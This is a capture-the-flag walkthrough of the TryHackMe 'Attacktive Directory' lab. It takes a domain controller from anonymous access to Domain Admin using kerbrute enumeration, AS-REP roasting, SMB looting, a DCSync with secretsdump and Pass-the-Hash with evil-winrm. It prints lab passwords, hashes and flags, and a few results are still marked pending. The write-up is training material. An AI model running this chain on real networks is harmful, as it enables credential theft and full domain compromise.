# Walkthrough — Attacktive Directory

> Technical narrative: an Active Directory attack from unauthenticated outsider to Domain Admin.

**Target:** `10.129.173.201`  ·  **Room:** https://tryhackme.com/room/attacktivedirectory  ·  **Date:** 2026-11-23
**Scenario:** A Windows Server **Domain Controller**. Goal: enumerate the domain, obtain a foothold credential, loot, and escalate to **Domain Administrator**.

---

## Phase 1 — Recon & enumeration

### 1.1 Full port scan

```bash
export IP=10.129.173.201
nmap -p- --min-rate 10000 -T4 $IP -oN scans/01-allports.txt
```
_Result: Domain Controller fingerprint confirmed — 53 (DNS), 80 (HTTP), **88 (Kerberos)**, 135/139/445 (RPC/SMB), **389/636/3268/3269 (LDAP/GC)**, 464 (kpasswd), 593, 3389 (RDP), **5985/47001 (WinRM)**, 9389 (ADWS), plus dynamic RPC high ports. Kerberos + LDAP + ADWS = this is a DC; the attack surface is identity/credentials._

### 1.2 Service/version scan on open ports

```bash
nmap -p <ports> -sC -sV -oN scans/02-services.txt $IP
```
_Expecting a Domain Controller footprint: 53 (DNS), 88 (Kerberos), 135/139/445 (RPC/SMB), 389/3268 (LDAP), 464 (kpasswd), 593, 636 (LDAPS), 3389 (RDP), 5985 (WinRM)._

---

## Phase 2 — Domain & user enumeration

- `enum4linux -A $IP` → **null sessions allowed** (`username '' password ''`) — anonymous SMB access (finding), but domain name not extracted on Server 2019.
- `crackmapexec smb $IP` → **domain = `spookysec.local`**, host `ATTACKTIVEDIREC`, Windows Server 2019 (Build 17763), `signing:True` (SMB signing enforced).

```bash
echo "10.129.173.201 spookysec.local" | sudo tee -a /etc/hosts
```

### Kerberos user enumeration (kerbrute)

```bash
kerbrute userenum --dc 10.129.173.201 -d spookysec.local /root/userlist.txt
```
_Result: 8 valid accounts — `james`, **`svc-admin`** (service acct), `robin`, `darkstar`, `administrator`, **`backup`**, `paradox`, `ori`._

## Phase 3 — AS-REP Roasting (foothold)

`svc-admin` has "Do not require Kerberos pre-authentication" set, so the DC will hand out an AS-REP encrypted with the account's password-derived key to **anyone**, unauthenticated — crackable offline.

```bash
impacket-GetNPUsers spookysec.local/svc-admin -no-pass -dc-ip 10.129.173.201 -format hashcat -outputfile loot/asrep.hash
```
_Result:_ _(pending — $krb5asrep$ hash)_

Crack it (John auto-detects `krb5asrep`; hashcat mode 18200 also works):
```bash
john asrep.hash --wordlist=/root/passwordlist.txt
```
_Result: **`svc-admin : management2005`** (cracked <1s). First valid domain credential._

## Phase 4 — SMB loot

Authenticated share enumeration with the foothold credential:
```bash
crackmapexec smb 10.129.173.201 -u svc-admin -p management2005 --shares
```
_Result:_ _(pending — look for a readable `backup` share)_

```bash
smbclient //10.129.173.201/backup -U 'spookysec.local/svc-admin%management2005'
# smb> get <file>
```
_Result:_ _(pending — backup account credential)_

## Phase 5 — Domain compromise (DCSync + Pass-the-Hash)

`backup_credentials.txt` (base64) decoded to `backup@spookysec.local:backup2517860`. The `backup` account holds replication rights → DCSync.

```bash
impacket-secretsdump spookysec.local/backup:backup2517860@10.129.173.201
```
_Result:_ _(pending — full NTLM hash dump incl. Administrator)_

_Result: DCSync succeeded (the top `rpc_s_access_denied` is only the SAM fallback failing). Dumped all domain NTLM hashes. **Administrator NTLM = `0e0363213e37b94221497260b0bcb4fc`** (shared by `a-spooks`, the human DA); `krbtgt` hash also obtained (Golden Ticket capable)._

Pass-the-Hash into the DC as Administrator (no cracking needed):
```bash
evil-winrm -i 10.129.173.201 -u administrator -H 0e0363213e37b94221497260b0bcb4fc
```
_Result: interactive shell as **`thm-ad\administrator`** — Domain Admin on the DC. (NetBIOS domain confirmed here as **THM-AD**.)_

## Phase 6 — Proof of compromise

```
whoami  -> thm-ad\administrator
```
| Flag | Location | Value |
|------|----------|-------|
| User | `C:\Users\svc-admin\Desktop\user.txt.txt` | `TryHackMe{K3rb3r0s_Pr3_4uth}` |
| PrivEsc | `C:\Users\backup\Desktop\PrivEsc.txt` | `TryHackMe{B4ckM3UpSc0tty!}` |
| Root | `C:\Users\Administrator\Desktop\root.txt` | `TryHackMe{4ctiveD1rectoryM4st3r}` |

## Attack chain summary

nmap (DC fingerprint) → `crackmapexec` (domain `spookysec.local`) → `kerbrute userenum` (8 users) → **AS-REP Roast** `svc-admin` (no pre-auth) → John crack (`management2005`) → SMB loot `backup` share → base64-decoded `backup:backup2517860` → **DCSync** (`secretsdump`, backup's replication rights) → Administrator NTLM → **Pass-the-Hash** (Evil-WinRM) → **Domain Admin**.
